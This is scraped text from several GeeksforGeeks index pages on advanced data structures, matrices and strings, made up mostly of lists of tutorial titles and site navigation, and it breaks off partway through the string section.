Root to leaf path with maximum distinct nodes Game of replacing array elements Length of longest strict bitonic subsequence Last seen array element (last appearance is earliest) Quick Links : ‘Practice Problems’ on Hashing Top 20 Hashing Technique based Interview Questions ‘Quizzes’ on Hashing ‘Videos’ on Hashing If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Advanced Data Structures - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Advanced Data Structures Data Structures are used to store and manage data in an efficient and organised way for faster and easy access and modification of Data. Some of the basic data structures are Arrays, LinkedList, Stacks, Queues etc. This page will contain some of the complex and advanced Data Structures like Disjoint Sets, Self-Balancing Trees, Segment Trees, Tries etc. ‘Recent Articles’ Topics: Advanced Lists Segment Tree Trie Binary Indexed Tree Suffix Array and Tree Self-Balancing BSTs K Dimensional Tree Disjoint Set n-ary Tree Others Misc Practice Problems Advanced Lists : Generic Linked List in C Memory efficient Doubly Linked List XOR Linked List | Set 1 XOR Linked List | Set 2 Skip List Self-Organizing List Unrolled Linked List Segment Tree : Sum of given range Range minimum query Lazy Propagation Persistent Segment Tree Efficiently design Insert, Delete and Median queries on a set Range Minimum Query (Square Root Decomposition and Sparse Table) Range LCM queries Min-Max Range queries in array Count and Toggle queries on Binary array Querying maximum number of divisors that a number in a given range has LCA in a binary tree using RMQ GCDs of given index ranges in an array Smallest sub-array with given GCD Largest Rectangular Area in a Histogram Heavy Light Decomposition | Set 1 (Introduction) Heavy Light Decomposition | Set 2 (Implementation) Reconstructing Segment Tree Longest Common Extension / LCE | Set 1 (Introduction and Naive Method) Longest Common Extension / LCE | Set 2 ( Reduction to RMQ) Longest Common Extension / LCE | Set 3 (Segment Tree Method) Trie : Trie | (Insert and Search) Trie | (Delete) Longest prefix matching – A Trie based solution in Java Pattern Searching using a Trie of all Suffixes Find shortest unique prefix for every word in a given list Longest Common Prefix Print all words matching a pattern in CamelCase Notation Dictonary Implement a Phone Directory Construct a unique matrix n x n for an input n Print unique rows in a given boolean matrix Count of distinct substrings of a string using Suffix Trie Find pair of rows in a binary matrix that has maximum bit difference Minimum XOR Value Pair Find the maximum subarray XOR in a given array Weighted Prefix Search Boggle Print all valid words that are possible using Characters of Array Find the k most frequent words from a file Palindrome pair in an array of words (or strings) Word formation using concatenation of two dictionary words Given a sequence of words, print all anagrams together How to Implement Reverse DNS Look Up Cache? How to Implement Forward DNS Look Up Cache? Binary Indexed Tree : Binary Indexed Tree or Fenwick Tree Two Dimensional Binary Indexed Tree or Fenwick Tree Binary Indexed Tree : Range Updates and Point Queries Binary Indexed Tree : Range Update and Range Queries Count inversions in an array Count Inversions of size three in a give array Count inversion pairs in a matrix Counting Triangles in a Rectangular space using BIT Number of triangles amongst horizontal and vertical line segments Querying the number of distinct colors in a subtree of a colored tree using BIT Queries on substring palindrome formation proto van Emde Boas Trees | Background and Introduction Suffix Array and Suffix Tree : Suffix Array Introduction Suffix Array nLogn Algorithm kasai’s Algorithm for Construction of LCP array from Suffix Array Suffix Tree Introduction Ukkonen’s Suffix Tree Construction – Part 1 Ukkonen’s Suffix Tree Construction – Part 2 Ukkonen’s Suffix Tree Construction – Part 3 Ukkonen’s Suffix Tree Construction – Part 4 Ukkonen’s Suffix Tree Construction – Part 5 Ukkonen’s Suffix Tree Construction – Part 6 Generalized Suffix Tree Suffix Tree Application 1 – Substring Check Suffix Tree Application 2 – Searching All Patterns Suffix Tree Application 3 – Longest Repeated Substring Suffix Tree Application 4 – Build Linear Time Suffix Array Suffix Tree Application 5 – Longest Common Substring Suffix Tree Application 6 – Longest Palindromic Substring Print Kth character in sorted concatenated substrings of a string Self-Balancing BSTs : AVL : AVL Tree | Set 1 (Insertion) AVL Tree | Set 2 (Deletion) AVL with duplicate keys Splay Tree : Splay Tree | Set 1 (Search) Splay Tree | Set 2 (Insert) B Tree : B-Tree | Set 1 (Introduction) B-Tree | Set 2 (Insert) B-Tree | Set 3 (Delete) Quiz on B Tree Red Black Tree : Red-Black Tree | Set 1 (Introduction) Red Black Tree Insertion Red-Black Tree Deletion C Program for Red Black Tree Insertion ScapeGoat Tree and Treap : ScapeGoat Tree | (Introduction and Insertion) Treap | Set 1 (A Randomized Binary Search Tree) Treap | Set 2 (Implementation of Search, Insert and Delete) Problems : Maximum subarray sum modulo m Find N’th item in a set formed by sum of two arrays Count smaller elements on right side Sort an array according to absolute difference with given value Maximum product of an increasing subsequence of size 3 Merge Two Balanced Binary Search Trees How to sort a big array with many repetitions? How to determine if a binary tree is height-balanced? Maximum Occurrence in a Given Range How to handle duplicates in Binary Search Tree? last unique URL from long list of URLs in single traversal ‘Quiz’ on Balanced Binary Searched Trees k Dimensional Tree : K D Tree (Search and Insert) K D Tree (Find Minimum) K D Tree (Delete) Disjoint Set: Disjoint Set Data Structures (Java Implementation) Find the number of Islands n-ary Trees and LCA : Mirror of n-ary Tree Check mirror in n-ary tree Diameter of an N-ary tree Depth of an N-Ary tree Height of n-ary tree if parent array is given Second Largest element in n-ary tree Diameter of n-ary tree using BFS Number of ways to traverse an N-ary tree Number of nodes greater than a given value in n-ary tree Number of children of given node in n-ary Tree Number of siblings of a given Node in n-ary Tree Next Larger element in n-ary tree Immediate Smaller element in an N-ary Tree Sum of all elements of N-ary Tree Serialize and Deserialize an N-ary Tree Subtrees formed after bursting nodes Locking and Unlocking of Resources arranged in the form of n-ary Tree Creating a tree with Left-Child Right-Sibling Representation LCA for general or n-ary trees (Sparse Matrix DP approach < O(nlogn), O(logn)>) Sqrt (or Square Root) Decomposition | Set 2 (LCA of Tree in O(sqrt(height)) time) LCA for n-ary Tree | Constant Query O(1) Tarjan’s off-line lowest common ancestors algorithm Left-Child Right-Sibling Representation of Tree DFS for a n-ary tree (acyclic graph) represented as adjacency list Node having maximum sum of immediate children and itself in n-ary tree Given a n-ary tree, count number of nodes which have more number of children than parents General Tree (Each node can have arbitrary number of children) Level Order Traversal Others : Palindromic Tree | Introduction & Implementation Ternary Search Tree Interval Tree BK-Tree | Introduction & Implementation Ropes Data Structure (Fast String Concatenation) Summed Area Table – Submatrix Summation Implement LRU Cache Sort numbers stored on different machines Substring with highest frequency length product Find whether a subarray is in form of a mountain or not Find all possible interpretations of an array of digits How to design a tiny URL or URL shortener? Design a data structure that supports insert, delete, search and getRandom in constant time Design an efficient data structure for given operations Tournament Tree (Winner Tree) and Binary Heap Second minimum element using minimum comparisons Binomial Heap Fibonacci Heap Leftist Heap Decision Trees – Fake (Counterfeit) Coin Puzzle (12 Coin Puzzle) Spaghetti Stack Data Structure for Dictionary and Spell Checker Cartesian Tree Cartesian Tree Sorting Sparse Set Centroid Decomposition of Tree Gomory-Hu Tree Misc : Persistent Data Structure Tree Sort Applications of tree data structure Advantages of BST over Hash Table Why is Binary Heap Preferred over BST for Priority Queue? Inclusion Exclusion principle and programming applications Practice Problems : Trie Segment Tree Binary Search Tree Binary Indexed Tree If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Matrix Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Matrix Archives A matrix represents a collection of numbers arranged in an order of rows and columns. It is necessary to enclose the elements of a matrix in parentheses or brackets. A matrix with 9 elements is shown below. This Matrix [M] has 3 rows and 3 columns. Each element of matrix [M] can be referred to by its row and column number. For example, a23 = 6. Recent Articles on Matrix Rotate Matrix Elements Inplace rotate square matrix by 90 degrees | Set 1 Rotate a matrix by 90 degree without using any extra space | Set 2 Rotate a Matrix by 180 degree Rotate each ring of matrix anticlockwise by K elements Turn an image by 90 degree Check if all rows of a matrix are circular rotations of each other Sort the given matrix Find the row with maximum number of 1s Find median in row wise sorted matrix Matrix Multiplication | Recursive Program to multiply two matrices Program for scalar multiplication of a matrix Program to print Lower triangular and Upper triangular matrix of an array Find distinct elements common to all rows of a matrix Print a given matrix in spiral form Find maximum element of each row in a matrix Find unique elements in a matrix Shift matrix elements row-wise by k Different Operations on Matrices Print a given matrix in counter-clock wise spiral form Swap major and minor diagonals of a square matrix Maximum path sum in matrix Squares of Matrix Diagonal Elements Move matrix elements in given direction and add elements with same value Sorting rows of matrix in ascending order followed by columns in descending order Sum of middle row and column in Matrix Row-wise vs column-wise traversal of matrix Rotate the matrix right by K times Program to check idempotent matrix Program to check Involutory Matrix Interchange elements of first and last rows in matrix Print matrix in zag-zag fashion Row wise sorting in 2D array Program for Markov matrix Program to check diagonal matrix and scalar matrix Sort the matrix row-wise and column-wise Find the number of islands Magic Square | Even Order Magic Square Check given matrix is magic square or not Check given matrix is magic square or not Kronecker Product of two matrices Count sub-matrices having sum divisible ‘k’ Diagonally Dominant Matrix Minimum operations required to make each row and column of matrix equals Count frequency of k in a matrix of size n where matrix(i, j) = i+j Given 1’s, 2’s, 3’s ……k’s print them in zig zag way. Number of cells a queen can move with obstacles on the chessborad Maximum product of 4 adjacent elements in matrix Minimum flip required to make Binary Matrix symmetric Program to check if matrix is lower triangular Program to check if matrix is upper triangular Frequencies of even and odd numbers in a matrix Center element of matrix equals sums of half diagonals Program for Identity Matrix Program to swap upper diagonal elements with lower diagonal elements of matrix. Sparse Matrix Representations Ways of filling matrix such that product of all rows and all columns are equal to unity Mirror of matrix across diagonal Find if there is a rectangle in binary matrix with corners as 1 Find all rectangles filled with 0 Shortest distance between two cells in a matrix or grid Counting sets of 1s and 0s in a binary matrix Search in a row wise and column wise sorted matrix Create a matrix with alternating rectangles of O and X Zigzag (or diagonal) traversal of Matrix Inplace (Fixed space) M x N size matrix transpose | Updated Minimum cost to sort a matrix of numbers from 0 to n^2 – 1 Unique cells in a binary matrix Count entries equal to x in a special matrix Check if a given matrix is sparse or not Row-wise common elements in two diagonals of a square matrix Check if sums of i-th row and i-th column are same in matrix Find row number of a binary matrix having maximum number of 1s Program to check if a matrix is symmetric Find if a 2-D array is completely traversed or not by following the cell values Program to Print Matrix in Z form Print all palindromic paths from top left to bottom right in a matrix Possible moves of knight Efficiently compute sums of diagonals of a matrix Boundary elements of a Matrix Print a matrix in a spiral form starting from a point Print matrix in snake pattern Program to Interchange Diagonals of Matrix Find difference between sums of two diagonals Construct Ancestor Matrix from a Given Binary Tree Construct tree from ancestor matrix Circular Matrix (Construct a matrix with numbers 1 to m*n in spiral way) Program for Sudoku Generator Program for Conway’s Game Of Life Maximum sum of hour glass in matrix Maximum and Minimum in a square matrix. Print matrix in antispiral form Program to find Normal and Trace of a matrix Sort a Matrix in all way increasing order Minimum operations required to set all elements of binary matrix Print a given matrix in reverse spiral form C Program To Check whether Matrix is Skew Symmetric or not Sum of matrix element where each elements is integer division of row and column Sparse Matrix and its representations Find number of transformation to make two Matrix Equal Form coils in a matrix Sum of matrix in which each element is absolute difference of its row and column numbers Check horizontal and vertical symmetry in binary matrix Maximum determinant of a matrix with every values either 0 or n Sum of both diagonals of a spiral odd-order square matrix Find pair of rows in a binary matrix that has maximum bit difference Find all permuted rows of a given row in a matrix Find perimeter of shapes formed with 1s in binary matrix Print cells with same rectangular sums in a matrix Print matrix in diagonal pattern Maximum difference of sum of elements in two rows in a matrix Find pairs with given sum such that elements of pair are in different rows Total coverage of all zeros in a binary matrix Replace every matrix element with maximum of GCD of row or column Count all sorted rows in a matrix Queries in a Matrix Maximum XOR value in matrix Maximum mirrors which can transfer light from bottom to right Direction at last square block Print K’th element in spiral form of matrix Find if given matrix is Toeplitz or not Count zeros in a row wise and column wise sorted matrix Count Negative Numbers in a Column-Wise and Row-Wise Sorted Matrix Find size of the largest ‘+’ formed by all ones in a binary matrix Return previous element in an expanding matrix Print n x n spiral matrix using O(1) extra space Shortest path in a Binary Maze Find orientation of a pattern in a matrix Find a specific pair in Matrix Print maximum sum square sub-matrix of given size Common elements in all rows of a given matrix In-place convert matrix in specific order A Boolean Matrix Question Given a Boolean Matrix, find k such that all elements in k’th row are 0 and k’th column are 1. Print unique rows in a given boolean matrix Find the largest rectangle of 1’s with swapping of columns allowed Validity of a given Tic-Tac-Toe board configuration Submatrix Sum Queries Program for Rank of Matrix Maximum size rectangle binary sub-matrix with all 1s Maximum size square sub-matrix with all 1s Find sum of all elements in a matrix except the elements in row and/or column of given cell? Count number of islands where every island is row-wise and column-wise separated Find a common element in all rows of a given row-wise sorted matrix Given a matrix of ‘O’ and ‘X’, replace ‘O’ with ‘X’ if surrounded by ‘X’ Given a matrix of ‘O’ and ‘X’, find the largest subsquare surrounded by ‘X’ Flood fill Algorithm – how to implement fill() in paint? Print all elements in sorted order from row and column wise sorted matrix Given an n x n square matrix, find sum of all sub-squares of size k x k Program to find transpose of a matrix C program for addition of two matrices C program for subtraction of matrices Collect maximum points in a grid using two traversals Collect maximum coins before hitting a dead end Number of paths with exactly k coins Find length of the longest consecutive path from a given starting character Find the longest path in a matrix with given constraints Minimum Initial Points to Reach Destination Divide and Conquer | Set 5 (Strassen’s Matrix Multiplication) Dynamic Programming | Set 27 (Maximum sum rectangle in a 2D matrix) Quick Links : ‘Practice Problems’ on Arrays ‘Quizzes’ on Arrays ‘Video Tutorials’ on Arrays If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

String Data Structure - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects String Data Structure Strings are defined as an array of characters. The difference between a character array and a string is the string is terminated with a special character ‘\0’. Declaring a string is as simple as declaring a one dimensional array. Below is the basic syntax for declaring a string in C programming language. char str_name[size]; ‘Recent Articles’ on Strings Topics : Basics String in C & C++ Strings in Java String in Python Arthimetic Operation in String Character Counting Based Problems Subsequence & Substring Reverse & Rotation Sorting & Searching Case Sensitive String Occurrence Based String Spacing Anagram Palindrome Binary String Lexicographic pattern Pattern Searching Split String Balance Parentheses & Bracket Evaluation Conversion Misc Quick Links Basics : Function to copy string Pangram Checking Missing characters to make a string Pangram Check if a string is Pangrammatic Lipogram Removing punctuations from a given string Rearrange characters in a string such that no two adjacent are same Program to check if input is an integer or a string Quick way to check if all the characters of a string are same Program to find the initials of a name Check Whether a number is Duck Number or not Round the given number to nearest multiple of 10 Change string to a new character set Find one extra character in a string Strings in C & C++ : Array of Strings in C++ (3 Different Ways to Create) Strings in C Storage for Strings in C sprintf() in C C program to find second most frequent character C Program to Sort an array of names or strings C++ Program to remove spaces from a string String Class in C++ C++ program to concatenate 